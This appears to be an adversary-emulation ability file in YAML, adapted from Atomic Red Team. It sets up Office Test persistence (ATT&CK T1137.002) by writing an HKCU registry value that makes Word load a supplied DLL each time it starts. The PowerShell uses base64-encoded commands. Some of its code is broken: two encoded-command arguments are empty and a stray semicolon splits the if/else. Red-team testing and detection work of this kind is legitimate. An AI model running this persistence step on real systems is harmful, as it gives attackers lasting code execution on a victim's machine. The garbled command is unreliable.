- requirements: []
  name: Soumaia ART Tests - Office Application Startup Test Persistence (HKCU)
  description: 'Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office

    application is started. Key is used for debugging purposes. Not created by default & exist in HKCU & HKLM hives.'
  tactic: persistence
  technique_id: T1137.002
  technique_name: 'Office Application Startup: Office Test'
  executors:
  - cleanup:
    - Stop-Process -Name "notepad","WinWord" -ErrorAction Ignore; Remove-Item "HKCU:\Software\Microsoft\Office test\Special\Perf" -ErrorAction Ignore
    timeout: 60
    platform: windows
    name: psh
    payloads:
    - bin
    - officetest_x64.dll
    - officetest_x86.dll
    parsers: []
    command: powershell -NoProfile -EncodedCommand ; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAFcAbwByAGQAIABtAGEAbgB1AGEAbABsAHkAIAB0AG8AIABtAGUAZQB0ACAAdABoAGkAcwAgAHIAZQBxAHUAaQByAGUAbQBlAG4AdAAiAAoA }; powershell -NoProfile -EncodedCommand aQBmACAAKAAoAFQAZQBzAHQALQBQAGEAdABoACAAIgAuAFwAbwBmAGYAaQBjAGUAdABlAHMAdABfAHgANgA0AC4AZABsAGwAIgApACAALQBhAG4AZAAgACgAVABlAHMAdAAtAFAAYQB0AGgAIAAiAC4AXABvAGYAZgBpAGMAZQB0AGUAcwB0AF8AeAA4ADYALgBkAGwAbAAiACkAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand  }; $wdApp = New-Object -COMObject "Word.Application"; if(-not $wdApp.path.contains("Program Files (x86)")); { Write-Host "64-bit Office"; reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d ".\officetest_x64.dll" /f } else{ Write-Host "32-bit Office"; reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d ".\officetest_x86.dll" /f }; Stop-Process -Name "WinWord"; Start-Process "WinWord"
  id: bdd0ea26-eb55-521e-b2b3-4ccb3d082f39
